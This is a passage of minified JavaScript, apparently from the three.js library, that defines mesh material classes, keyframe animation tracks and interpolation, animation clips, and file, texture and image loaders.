Ne(0),this.emissiveIntensity=1,this.emissiveMap=null,this.specularMap=null,this.alphaMap=null,this.envMap=null,this.combine=0,this.reflectivity=1,this.refractionRatio=.98,this.wireframe=!1,this.wireframeLinewidth=1,this.wireframeLinecap="round",this.wireframeLinejoin="round",this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function Pa(e){We.call(this),this.defines={MATCAP:""},this.type="MeshMatcapMaterial",this.color=new Ne(16777215),this.matcap=null,this.map=null,this.bumpMap=null,this.bumpScale=1,this.normalMap=null,this.normalMapType=0,this.normalScale=new f(1,1),this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.alphaMap=null,this.skinning=!1,this.morphTargets=!1,this.morphNormals=!1,this.setValues(e)}function La(e){Nr.call(this),this.type="LineDashedMaterial",this.scale=1,this.dashSize=3,this.gapSize=1,this.setValues(e)}xa.prototype=Object.create(We.prototype),xa.prototype.constructor=xa,xa.prototype.isShadowMaterial=!0,xa.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.color.copy(e.color),this},_a.prototype=Object.create(Vt.prototype),_a.prototype.constructor=_a,_a.prototype.isRawShaderMaterial=!0,Ma.prototype=Object.create(We.prototype),Ma.prototype.constructor=Ma,Ma.prototype.isMeshStandardMaterial=!0,Ma.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.defines={STANDARD:""},this.color.copy(e.color),this.roughness=e.roughness,this.metalness=e.metalness,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.roughnessMap=e.roughnessMap,this.metalnessMap=e.metalnessMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.envMapIntensity=e.envMapIntensity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},Sa.prototype=Object.create(Ma.prototype),Sa.prototype.constructor=Sa,Sa.prototype.isMeshPhysicalMaterial=!0,Sa.prototype.copy=function(e){return Ma.prototype.copy.call(this,e),this.defines={STANDARD:"",PHYSICAL:""},this.reflectivity=e.reflectivity,this.clearcoat=e.clearcoat,this.clearcoatRoughness=e.clearcoatRoughness,e.sheen?this.sheen=(this.sheen||new Ne).copy(e.sheen):this.sheen=null,this.clearcoatNormalMap=e.clearcoatNormalMap,this.clearcoatNormalScale.copy(e.clearcoatNormalScale),this.transparency=e.transparency,this},Ta.prototype=Object.create(We.prototype),Ta.prototype.constructor=Ta,Ta.prototype.isMeshPhongMaterial=!0,Ta.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.color.copy(e.color),this.specular.copy(e.specular),this.shininess=e.shininess,this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},Ea.prototype=Object.create(Ta.prototype),Ea.prototype.constructor=Ea,Ea.prototype.isMeshToonMaterial=!0,Ea.prototype.copy=function(e){return Ta.prototype.copy.call(this,e),this.gradientMap=e.gradientMap,this},Aa.prototype=Object.create(We.prototype),Aa.prototype.constructor=Aa,Aa.prototype.isMeshNormalMaterial=!0,Aa.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},Ca.prototype=Object.create(We.prototype),Ca.prototype.constructor=Ca,Ca.prototype.isMeshLambertMaterial=!0,Ca.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.color.copy(e.color),this.map=e.map,this.lightMap=e.lightMap,this.lightMapIntensity=e.lightMapIntensity,this.aoMap=e.aoMap,this.aoMapIntensity=e.aoMapIntensity,this.emissive.copy(e.emissive),this.emissiveMap=e.emissiveMap,this.emissiveIntensity=e.emissiveIntensity,this.specularMap=e.specularMap,this.alphaMap=e.alphaMap,this.envMap=e.envMap,this.combine=e.combine,this.reflectivity=e.reflectivity,this.refractionRatio=e.refractionRatio,this.wireframe=e.wireframe,this.wireframeLinewidth=e.wireframeLinewidth,this.wireframeLinecap=e.wireframeLinecap,this.wireframeLinejoin=e.wireframeLinejoin,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},Pa.prototype=Object.create(We.prototype),Pa.prototype.constructor=Pa,Pa.prototype.isMeshMatcapMaterial=!0,Pa.prototype.copy=function(e){return We.prototype.copy.call(this,e),this.defines={MATCAP:""},this.color.copy(e.color),this.matcap=e.matcap,this.map=e.map,this.bumpMap=e.bumpMap,this.bumpScale=e.bumpScale,this.normalMap=e.normalMap,this.normalMapType=e.normalMapType,this.normalScale.copy(e.normalScale),this.displacementMap=e.displacementMap,this.displacementScale=e.displacementScale,this.displacementBias=e.displacementBias,this.alphaMap=e.alphaMap,this.skinning=e.skinning,this.morphTargets=e.morphTargets,this.morphNormals=e.morphNormals,this},La.prototype=Object.create(Nr.prototype),La.prototype.constructor=La,La.prototype.isLineDashedMaterial=!0,La.prototype.copy=function(e){return Nr.prototype.copy.call(this,e),this.scale=e.scale,this.dashSize=e.dashSize,this.gapSize=e.gapSize,this};var Ra=Object.freeze({__proto__:null,ShadowMaterial:xa,SpriteMaterial:mr,RawShaderMaterial:_a,ShaderMaterial:Vt,PointsMaterial:Qr,MeshPhysicalMaterial:Sa,MeshStandardMaterial:Ma,MeshPhongMaterial:Ta,MeshToonMaterial:Ea,MeshNormalMaterial:Aa,MeshLambertMaterial:Ca,MeshDepthMaterial:Yn,MeshDistanceMaterial:Zn,MeshBasicMaterial:qe,MeshMatcapMaterial:Pa,LineDashedMaterial:La,LineBasicMaterial:Nr,Material:We}),ka={arraySlice:function(e,t,i){return ka.isTypedArray(e)?new e.constructor(e.subarray(t,void 0!==i?i:e.length)):e.slice(t,i)},convertArray:function(e,t,i){return!e||!i&&e.constructor===t?e:"number"==typeof t.BYTES_PER_ELEMENT?new t(e):Array.prototype.slice.call(e)},isTypedArray:function(e){return ArrayBuffer.isView(e)&&!(e instanceof DataView)},getKeyframeOrder:function(e){for(var t=e.length,i=new Array(t),n=0;n!==t;++n)i[n]=n;return i.sort((function(t,i){return e[t]-e[i]})),i},sortedArray:function(e,t,i){for(var n=e.length,r=new e.constructor(n),o=0,a=0;a!==n;++o)for(var s=i[o]*t,c=0;c!==t;++c)r[a++]=e[s+c];return r},flattenJSON:function(e,t,i,n){for(var r=1,o=e[0];void 0!==o&&void 0===o[n];)o=e[r++];if(void 0!==o){var a=o[n];if(void 0!==a)if(Array.isArray(a))do{void 0!==(a=o[n])&&(t.push(o.time),i.push.apply(i,a)),o=e[r++]}while(void 0!==o);else if(void 0!==a.toArray)do{void 0!==(a=o[n])&&(t.push(o.time),a.toArray(i,i.length)),o=e[r++]}while(void 0!==o);else do{void 0!==(a=o[n])&&(t.push(o.time),i.push(a)),o=e[r++]}while(void 0!==o)}}};function Oa(e,t,i,n){this.parameterPositions=e,this._cachedIndex=0,this.resultBuffer=void 0!==n?n:new t.constructor(i),this.sampleValues=t,this.valueSize=i}function Ia(e,t,i,n){Oa.call(this,e,t,i,n),this._weightPrev=-0,this._offsetPrev=-0,this._weightNext=-0,this._offsetNext=-0}function Ba(e,t,i,n){Oa.call(this,e,t,i,n)}function Da(e,t,i,n){Oa.call(this,e,t,i,n)}function za(e,t,i,n){if(void 0===e)throw new Error("THREE.KeyframeTrack: track name is undefined");if(void 0===t||0===t.length)throw new Error("THREE.KeyframeTrack: no keyframes in track named "+e);this.name=e,this.times=ka.convertArray(t,this.TimeBufferType),this.values=ka.convertArray(i,this.ValueBufferType),this.setInterpolation(n||this.DefaultInterpolation)}function Fa(e,t,i){za.call(this,e,t,i)}function Na(e,t,i,n){za.call(this,e,t,i,n)}function ja(e,t,i,n){za.call(this,e,t,i,n)}function Ua(e,t,i,n){Oa.call(this,e,t,i,n)}function Va(e,t,i,n){za.call(this,e,t,i,n)}function Ha(e,t,i,n){za.call(this,e,t,i,n)}function Ga(e,t,i,n){za.call(this,e,t,i,n)}function Wa(e,t,i){this.name=e,this.tracks=i,this.duration=void 0!==t?t:-1,this.uuid=p.generateUUID(),this.duration<0&&this.resetDuration()}function qa(e){if(void 0===e.type)throw new Error("THREE.KeyframeTrack: track type undefined, can not parse");var t=function(e){switch(e.toLowerCase()){case"scalar":case"double":case"float":case"number":case"integer":return ja;case"vector":case"vector2":case"vector3":case"vector4":return Ga;case"color":return Na;case"quaternion":return Va;case"bool":case"boolean":return Fa;case"string":return Ha}throw new Error("THREE.KeyframeTrack: Unsupported typeName: "+e)}(e.type);if(void 0===e.times){var i=[],n=[];ka.flattenJSON(e.keys,i,n,"value"),e.times=i,e.values=n}return void 0!==t.parse?t.parse(e):new t(e.name,e.times,e.values,e.interpolation)}Object.assign(Oa.prototype,{evaluate:function(e){var t=this.parameterPositions,i=this._cachedIndex,n=t[i],r=t[i-1];e:{t:{var o;i:{n:if(!(e<n)){for(var a=i+2;;){if(void 0===n){if(e<r)break n;return i=t.length,this._cachedIndex=i,this.afterEnd_(i-1,e,r)}if(i===a)break;if(r=n,e<(n=t[++i]))break t}o=t.length;break i}if(e>=r)break e;var s=t[1];e<s&&(i=2,r=s);for(a=i-2;;){if(void 0===r)return this._cachedIndex=0,this.beforeStart_(0,e,n);if(i===a)break;if(n=r,e>=(r=t[--i-1]))break t}o=i,i=0}for(;i<o;){var c=i+o>>>1;e<t[c]?o=c:i=c+1}if(n=t[i],void 0===(r=t[i-1]))return this._cachedIndex=0,this.beforeStart_(0,e,n);if(void 0===n)return i=t.length,this._cachedIndex=i,this.afterEnd_(i-1,r,e)}this._cachedIndex=i,this.intervalChanged_(i,r,n)}return this.interpolate_(i,r,e,n)},settings:null,DefaultSettings_:{},getSettings_:function(){return this.settings||this.DefaultSettings_},copySampleValue_:function(e){for(var t=this.resultBuffer,i=this.sampleValues,n=this.valueSize,r=e*n,o=0;o!==n;++o)t[o]=i[r+o];return t},interpolate_:function(){throw new Error("call to abstract method")},intervalChanged_:function(){}}),Object.assign(Oa.prototype,{beforeStart_:Oa.prototype.copySampleValue_,afterEnd_:Oa.prototype.copySampleValue_}),Ia.prototype=Object.assign(Object.create(Oa.prototype),{constructor:Ia,DefaultSettings_:{endingStart:2400,endingEnd:2400},intervalChanged_:function(e,t,i){var n=this.parameterPositions,r=e-2,o=e+1,a=n[r],s=n[o];if(void 0===a)switch(this.getSettings_().endingStart){case 2401:r=e,a=2*t-i;break;case 2402:a=t+n[r=n.length-2]-n[r+1];break;default:r=e,a=i}if(void 0===s)switch(this.getSettings_().endingEnd){case 2401:o=e,s=2*i-t;break;case 2402:o=1,s=i+n[1]-n[0];break;default:o=e-1,s=t}var c=.5*(i-t),l=this.valueSize;this._weightPrev=c/(t-a),this._weightNext=c/(s-i),this._offsetPrev=r*l,this._offsetNext=o*l},interpolate_:function(e,t,i,n){for(var r=this.resultBuffer,o=this.sampleValues,a=this.valueSize,s=e*a,c=s-a,l=this._offsetPrev,h=this._offsetNext,u=this._weightPrev,d=this._weightNext,p=(i-t)/(n-t),f=p*p,m=f*p,v=-u*m+2*u*f-u*p,g=(1+u)*m+(-1.5-2*u)*f+(-.5+u)*p+1,y=(-1-d)*m+(1.5+d)*f+.5*p,b=d*m-d*f,w=0;w!==a;++w)r[w]=v*o[l+w]+g*o[c+w]+y*o[s+w]+b*o[h+w];return r}}),Ba.prototype=Object.assign(Object.create(Oa.prototype),{constructor:Ba,interpolate_:function(e,t,i,n){for(var r=this.resultBuffer,o=this.sampleValues,a=this.valueSize,s=e*a,c=s-a,l=(i-t)/(n-t),h=1-l,u=0;u!==a;++u)r[u]=o[c+u]*h+o[s+u]*l;return r}}),Da.prototype=Object.assign(Object.create(Oa.prototype),{constructor:Da,interpolate_:function(e){return this.copySampleValue_(e-1)}}),Object.assign(za,{toJSON:function(e){var t,i=e.constructor;if(void 0!==i.toJSON)t=i.toJSON(e);else{t={name:e.name,times:ka.convertArray(e.times,Array),values:ka.convertArray(e.values,Array)};var n=e.getInterpolation();n!==e.DefaultInterpolation&&(t.interpolation=n)}return t.type=e.ValueTypeName,t}}),Object.assign(za.prototype,{constructor:za,TimeBufferType:Float32Array,ValueBufferType:Float32Array,DefaultInterpolation:2301,InterpolantFactoryMethodDiscrete:function(e){return new Da(this.times,this.values,this.getValueSize(),e)},InterpolantFactoryMethodLinear:function(e){return new Ba(this.times,this.values,this.getValueSize(),e)},InterpolantFactoryMethodSmooth:function(e){return new Ia(this.times,this.values,this.getValueSize(),e)},setInterpolation:function(e){var t;switch(e){case 2300:t=this.InterpolantFactoryMethodDiscrete;break;case 2301:t=this.InterpolantFactoryMethodLinear;break;case 2302:t=this.InterpolantFactoryMethodSmooth}if(void 0===t){var i="unsupported interpolation for "+this.ValueTypeName+" keyframe track named "+this.name;if(void 0===this.createInterpolant){if(e===this.DefaultInterpolation)throw new Error(i);this.setInterpolation(this.DefaultInterpolation)}return console.warn("THREE.KeyframeTrack:",i),this}return this.createInterpolant=t,this},getInterpolation:function(){switch(this.createInterpolant){case this.InterpolantFactoryMethodDiscrete:return 2300;case this.InterpolantFactoryMethodLinear:return 2301;case this.InterpolantFactoryMethodSmooth:return 2302}},getValueSize:function(){return this.values.length/this.times.length},shift:function(e){if(0!==e)for(var t=this.times,i=0,n=t.length;i!==n;++i)t[i]+=e;return this},scale:function(e){if(1!==e)for(var t=this.times,i=0,n=t.length;i!==n;++i)t[i]*=e;return this},trim:function(e,t){for(var i=this.times,n=i.length,r=0,o=n-1;r!==n&&i[r]<e;)++r;for(;-1!==o&&i[o]>t;)--o;if(++o,0!==r||o!==n){r>=o&&(r=(o=Math.max(o,1))-1);var a=this.getValueSize();this.times=ka.arraySlice(i,r,o),this.values=ka.arraySlice(this.values,r*a,o*a)}return this},validate:function(){var e=!0,t=this.getValueSize();t-Math.floor(t)!=0&&(console.error("THREE.KeyframeTrack: Invalid value size in track.",this),e=!1);var i=this.times,n=this.values,r=i.length;0===r&&(console.error("THREE.KeyframeTrack: Track is empty.",this),e=!1);for(var o=null,a=0;a!==r;a++){var s=i[a];if("number"==typeof s&&isNaN(s)){console.error("THREE.KeyframeTrack: Time is not a valid number.",this,a,s),e=!1;break}if(null!==o&&o>s){console.error("THREE.KeyframeTrack: Out of order keys.",this,a,s,o),e=!1;break}o=s}if(void 0!==n&&ka.isTypedArray(n)){a=0;for(var c=n.length;a!==c;++a){var l=n[a];if(isNaN(l)){console.error("THREE.KeyframeTrack: Value is not a valid number.",this,a,l),e=!1;break}}}return e},optimize:function(){for(var e=this.times,t=this.values,i=this.getValueSize(),n=2302===this.getInterpolation(),r=1,o=e.length-1,a=1;a<o;++a){var s=!1,c=e[a];if(c!==e[a+1]&&(1!==a||c!==c[0]))if(n)s=!0;else for(var l=a*i,h=l-i,u=l+i,d=0;d!==i;++d){var p=t[l+d];if(p!==t[h+d]||p!==t[u+d]){s=!0;break}}if(s){if(a!==r){e[r]=e[a];var f=a*i,m=r*i;for(d=0;d!==i;++d)t[m+d]=t[f+d]}++r}}if(o>0){e[r]=e[o];for(f=o*i,m=r*i,d=0;d!==i;++d)t[m+d]=t[f+d];++r}return r!==e.length&&(this.times=ka.arraySlice(e,0,r),this.values=ka.arraySlice(t,0,r*i)),this},clone:function(){var e=ka.arraySlice(this.times,0),t=ka.arraySlice(this.values,0),i=new(0,this.constructor)(this.name,e,t);return i.createInterpolant=this.createInterpolant,i}}),Fa.prototype=Object.assign(Object.create(za.prototype),{constructor:Fa,ValueTypeName:"bool",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),Na.prototype=Object.assign(Object.create(za.prototype),{constructor:Na,ValueTypeName:"color"}),ja.prototype=Object.assign(Object.create(za.prototype),{constructor:ja,ValueTypeName:"number"}),Ua.prototype=Object.assign(Object.create(Oa.prototype),{constructor:Ua,interpolate_:function(e,t,i,n){for(var r=this.resultBuffer,o=this.sampleValues,a=this.valueSize,s=e*a,c=(i-t)/(n-t),l=s+a;s!==l;s+=4)m.slerpFlat(r,0,o,s-a,o,s,c);return r}}),Va.prototype=Object.assign(Object.create(za.prototype),{constructor:Va,ValueTypeName:"quaternion",DefaultInterpolation:2301,InterpolantFactoryMethodLinear:function(e){return new Ua(this.times,this.values,this.getValueSize(),e)},InterpolantFactoryMethodSmooth:void 0}),Ha.prototype=Object.assign(Object.create(za.prototype),{constructor:Ha,ValueTypeName:"string",ValueBufferType:Array,DefaultInterpolation:2300,InterpolantFactoryMethodLinear:void 0,InterpolantFactoryMethodSmooth:void 0}),Ga.prototype=Object.assign(Object.create(za.prototype),{constructor:Ga,ValueTypeName:"vector"}),Object.assign(Wa,{parse:function(e){for(var t=[],i=e.tracks,n=1/(e.fps||1),r=0,o=i.length;r!==o;++r)t.push(qa(i[r]).scale(n));return new Wa(e.name,e.duration,t)},toJSON:function(e){for(var t=[],i=e.tracks,n={name:e.name,duration:e.duration,tracks:t,uuid:e.uuid},r=0,o=i.length;r!==o;++r)t.push(za.toJSON(i[r]));return n},CreateFromMorphTargetSequence:function(e,t,i,n){for(var r=t.length,o=[],a=0;a<r;a++){var s=[],c=[];s.push((a+r-1)%r,a,(a+1)%r),c.push(0,1,0);var l=ka.getKeyframeOrder(s);s=ka.sortedArray(s,1,l),c=ka.sortedArray(c,1,l),n||0!==s[0]||(s.push(r),c.push(c[0])),o.push(new ja(".morphTargetInfluences["+t[a].name+"]",s,c).scale(1/i))}return new Wa(e,-1,o)},findByName:function(e,t){var i=e;if(!Array.isArray(e)){var n=e;i=n.geometry&&n.geometry.animations||n.animations}for(var r=0;r<i.length;r++)if(i[r].name===t)return i[r];return null},CreateClipsFromMorphTargetSequences:function(e,t,i){for(var n={},r=/^([\w-]*?)([\d]+)$/,o=0,a=e.length;o<a;o++){var s=e[o],c=s.name.match(r);if(c&&c.length>1){var l=n[u=c[1]];l||(n[u]=l=[]),l.push(s)}}var h=[];for(var u in n)h.push(Wa.CreateFromMorphTargetSequence(u,n[u],t,i));return h},parseAnimation:function(e,t){if(!e)return console.error("THREE.AnimationClip: No animation in JSONLoader data."),null;for(var i=function(e,t,i,n,r){if(0!==i.length){var o=[],a=[];ka.flattenJSON(i,o,a,n),0!==o.length&&r.push(new e(t,o,a))}},n=[],r=e.name||"default",o=e.length||-1,a=e.fps||30,s=e.hierarchy||[],c=0;c<s.length;c++){var l=s[c].keys;if(l&&0!==l.length)if(l[0].morphTargets){for(var h={},u=0;u<l.length;u++)if(l[u].morphTargets)for(var d=0;d<l[u].morphTargets.length;d++)h[l[u].morphTargets[d]]=-1;for(var p in h){var f=[],m=[];for(d=0;d!==l[u].morphTargets.length;++d){var v=l[u];f.push(v.time),m.push(v.morphTarget===p?1:0)}n.push(new ja(".morphTargetInfluence["+p+"]",f,m))}o=h.length*(a||1)}else{var g=".bones["+t[c].name+"]";i(Ga,g+".position",l,"pos",n),i(Va,g+".quaternion",l,"rot",n),i(Ga,g+".scale",l,"scl",n)}}return 0===n.length?null:new Wa(r,o,n)}}),Object.assign(Wa.prototype,{resetDuration:function(){for(var e=0,t=0,i=this.tracks.length;t!==i;++t){var n=this.tracks[t];e=Math.max(e,n.times[n.times.length-1])}return this.duration=e,this},trim:function(){for(var e=0;e<this.tracks.length;e++)this.tracks[e].trim(0,this.duration);return this},validate:function(){for(var e=!0,t=0;t<this.tracks.length;t++)e=e&&this.tracks[t].validate();return e},optimize:function(){for(var e=0;e<this.tracks.length;e++)this.tracks[e].optimize();return this},clone:function(){for(var e=[],t=0;t<this.tracks.length;t++)e.push(this.tracks[t].clone());return new Wa(this.name,this.duration,e)}});var Xa={enabled:!1,files:{},add:function(e,t){!1!==this.enabled&&(this.files[e]=t)},get:function(e){if(!1!==this.enabled)return this.files[e]},remove:function(e){delete this.files[e]},clear:function(){this.files={}}};function Ya(e,t,i){var n=this,r=!1,o=0,a=0,s=void 0,c=[];this.onStart=void 0,this.onLoad=e,this.onProgress=t,this.onError=i,this.itemStart=function(e){a++,!1===r&&void 0!==n.onStart&&n.onStart(e,o,a),r=!0},this.itemEnd=function(e){o++,void 0!==n.onProgress&&n.onProgress(e,o,a),o===a&&(r=!1,void 0!==n.onLoad&&n.onLoad())},this.itemError=function(e){void 0!==n.onError&&n.onError(e)},this.resolveURL=function(e){return s?s(e):e},this.setURLModifier=function(e){return s=e,this},this.addHandler=function(e,t){return c.push(e,t),this},this.removeHandler=function(e){var t=c.indexOf(e);return-1!==t&&c.splice(t,2),this},this.getHandler=function(e){for(var t=0,i=c.length;t<i;t+=2){var n=c[t],r=c[t+1];if(n.test(e))return r}return null}}var Za=new Ya;function Qa(e){this.manager=void 0!==e?e:Za,this.crossOrigin="anonymous",this.path="",this.resourcePath=""}Object.assign(Qa.prototype,{load:function(){},parse:function(){},setCrossOrigin:function(e){return this.crossOrigin=e,this},setPath:function(e){return this.path=e,this},setResourcePath:function(e){return this.resourcePath=e,this}});var $a={};function Ja(e){Qa.call(this,e)}function Ka(e){Qa.call(this,e)}function es(e){Qa.call(this,e)}function ts(e){Qa.call(this,e)}function is(e){Qa.call(this,e)}function ns(e){Qa.call(this,e)}function rs(e){Qa.call(this,e)}function os(){this.type="Curve",this.arcLengthDivisions=200}function as(e,t,i,n,r,o,a,s){os.call(this),this.type="EllipseCurve",this.aX=e||0,this.aY=t||0,this.xRadius=i||1,this.yRadius=n||1,this.aStartAngle=r||0,this.aEndAngle=o||2*Math.PI,this.aClockwise=a||!1,this.aRotation=s||0}function ss(e,t,i,n,r,o){as.call(this,e,t,i,i,n,r,o),this.type="ArcCurve"}function cs(){var e=0,t=0,i=0,n=0;function r(r,o,a,s){e=r,t=a,i=-3*r+3*o-2*a-s,n=2*r-2*o+a+s}return{initCatmullRom:function(e,t,i,n,o){r(t,i,o*(i-e),o*(n-t))},initNonuniformCatmullRom:function(e,t,i,n,o,a,s){var c=(t-e)/o-(i-e)/(o+a)+(i-t)/a,l=(i-t)/a-(n-t)/(a+s)+(n-i)/s;r(t,i,c*=a,l*=a)},calc:function(r){var o=r*r;return e+t*r+i*o+n*(o*r)}}}Ja.prototype=Object.assign(Object.create(Qa.prototype),{constructor:Ja,load:function(e,t,i,n){void 0===e&&(e=""),void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var r=this,o=Xa.get(e);if(void 0!==o)return r.manager.itemStart(e),setTimeout((function(){t&&t(o),r.manager.itemEnd(e)}),0),o;if(void 0===$a[e]){var a=e.match(/^data:(.*?)(;base64)?,(.*)$/);if(a){var s=a[1],c=!!a[2],l=a[3];l=decodeURIComponent(l),c&&(l=atob(l));try{var h,u=(this.responseType||"").toLowerCase();switch(u){case"arraybuffer":case"blob":for(var d=new Uint8Array(l.length),p=0;p<l.length;p++)d[p]=l.charCodeAt(p);h="blob"===u?new Blob([d.buffer],{type:s}):d.buffer;break;case"document":var f=new DOMParser;h=f.parseFromString(l,s);break;case"json":h=JSON.parse(l);break;default:h=l}setTimeout((function(){t&&t(h),r.manager.itemEnd(e)}),0)}catch(t){setTimeout((function(){n&&n(t),r.manager.itemError(e),r.manager.itemEnd(e)}),0)}}else{$a[e]=[],$a[e].push({onLoad:t,onProgress:i,onError:n});var m=new XMLHttpRequest;for(var v in m.open("GET",e,!0),m.addEventListener("load",(function(t){var i=this.response,n=$a[e];if(delete $a[e],200===this.status||0===this.status){0===this.status&&console.warn("THREE.FileLoader: HTTP Status 0 received."),Xa.add(e,i);for(var o=0,a=n.length;o<a;o++){(s=n[o]).onLoad&&s.onLoad(i)}r.manager.itemEnd(e)}else{for(o=0,a=n.length;o<a;o++){var s;(s=n[o]).onError&&s.onError(t)}r.manager.itemError(e),r.manager.itemEnd(e)}}),!1),m.addEventListener("progress",(function(t){for(var i=$a[e],n=0,r=i.length;n<r;n++){var o=i[n];o.onProgress&&o.onProgress(t)}}),!1),m.addEventListener("error",(function(t){var i=$a[e];delete $a[e];for(var n=0,o=i.length;n<o;n++){var a=i[n];a.onError&&a.onError(t)}r.manager.itemError(e),r.manager.itemEnd(e)}),!1),m.addEventListener("abort",(function(t){var i=$a[e];delete $a[e];for(var n=0,o=i.length;n<o;n++){var a=i[n];a.onError&&a.onError(t)}r.manager.itemError(e),r.manager.itemEnd(e)}),!1),void 0!==this.responseType&&(m.responseType=this.responseType),void 0!==this.withCredentials&&(m.withCredentials=this.withCredentials),m.overrideMimeType&&m.overrideMimeType(void 0!==this.mimeType?this.mimeType:"text/plain"),this.requestHeader)m.setRequestHeader(v,this.requestHeader[v]);m.send(null)}return r.manager.itemStart(e),m}$a[e].push({onLoad:t,onProgress:i,onError:n})},setResponseType:function(e){return this.responseType=e,this},setWithCredentials:function(e){return this.withCredentials=e,this},setMimeType:function(e){return this.mimeType=e,this},setRequestHeader:function(e){return this.requestHeader=e,this}}),Ka.prototype=Object.assign(Object.create(Qa.prototype),{constructor:Ka,load:function(e,t,i,n){var r=this,o=new Ja(r.manager);o.setPath(r.path),o.load(e,(function(e){t(r.parse(JSON.parse(e)))}),i,n)},parse:function(e){for(var t=[],i=0;i<e.length;i++){var n=Wa.parse(e[i]);t.push(n)}return t}}),es.prototype=Object.assign(Object.create(Qa.prototype),{constructor:es,load:function(e,t,i,n){var r=this,o=[],a=new ro;a.image=o;var s=new Ja(this.manager);function c(c){s.load(e[c],(function(e){var i=r.parse(e,!0);o[c]={width:i.width,height:i.height,format:i.format,mipmaps:i.mipmaps},6===(l+=1)&&(1===i.mipmapCount&&(a.minFilter=1006),a.format=i.format,a.needsUpdate=!0,t&&t(a))}),i,n)}if(s.setPath(this.path),s.setResponseType("arraybuffer"),Array.isArray(e))for(var l=0,h=0,u=e.length;h<u;++h)c(h);else s.load(e,(function(e){var i=r.parse(e,!0);if(i.isCubemap)for(var n=i.mipmaps.length/i.mipmapCount,s=0;s<n;s++){o[s]={mipmaps:[]};for(var c=0;c<i.mipmapCount;c++)o[s].mipmaps.push(i.mipmaps[s*i.mipmapCount+c]),o[s].format=i.format,o[s].width=i.width,o[s].height=i.height}else a.image.width=i.width,a.image.height=i.height,a.mipmaps=i.mipmaps;1===i.mipmapCount&&(a.minFilter=1006),a.format=i.format,a.needsUpdate=!0,t&&t(a)}),i,n);return a}}),ts.prototype=Object.assign(Object.create(Qa.prototype),{constructor:ts,load:function(e,t,i,n){var r=this,o=new Xt,a=new Ja(this.manager);return a.setResponseType("arraybuffer"),a.setPath(this.path),a.load(e,(function(e){var i=r.parse(e);i&&(void 0!==i.image?o.image=i.image:void 0!==i.data&&(o.image.width=i.width,o.image.height=i.height,o.image.data=i.data),o.wrapS=void 0!==i.wrapS?i.wrapS:1001,o.wrapT=void 0!==i.wrapT?i.wrapT:1001,o.magFilter=void 0!==i.magFilter?i.magFilter:1006,o.minFilter=void 0!==i.minFilter?i.minFilter:1008,o.anisotropy=void 0!==i.anisotropy?i.anisotropy:1,void 0!==i.format&&(o.format=i.format),void 0!==i.type&&(o.type=i.type),void 0!==i.mipmaps&&(o.mipmaps=i.mipmaps),1===i.mipmapCount&&(o.minFilter=1006),o.needsUpdate=!0,t&&t(o,i))}),i,n),o}}),is.prototype=Object.assign(Object.create(Qa.prototype),{constructor:is,load:function(e,t,i,n){void 0!==this.path&&(e=this.path+e),e=this.manager.resolveURL(e);var r=this,o=Xa.get(e);if(void 0!==o)return r.manager.itemStart(e),setTimeout((function(){t&&t(o),r.manager.itemEnd(e)}),0),o;var a=document.createElementNS("http://www.w3.org/1999/xhtml","img");function s(){a.removeEventListener("load",s,!1),a.removeEventListener("error",c,!1),Xa.add(e,this),t&&t(this),r.manager.itemEnd(e)}function c(t){a.removeEventListener("load",s,!1),a.removeEventListener("error",c,!1),n&&n(t),r.manager.itemError(e),r.manager.itemEnd(e)}return a.addEventListener("load",s,!1),a.addEventListener("error",c,!1),"data:"!==e.substr(0,5)&&void 0!==this.crossOrigin&&(a.crossOrigin=this.crossOrigin),r.manager.itemStart(e),a.src=e,a}}),ns.prototype=Object.assign(Object.create(Qa.prototype),{constructor:ns,load:function(e,t,i,n){var r=new xi,o=new 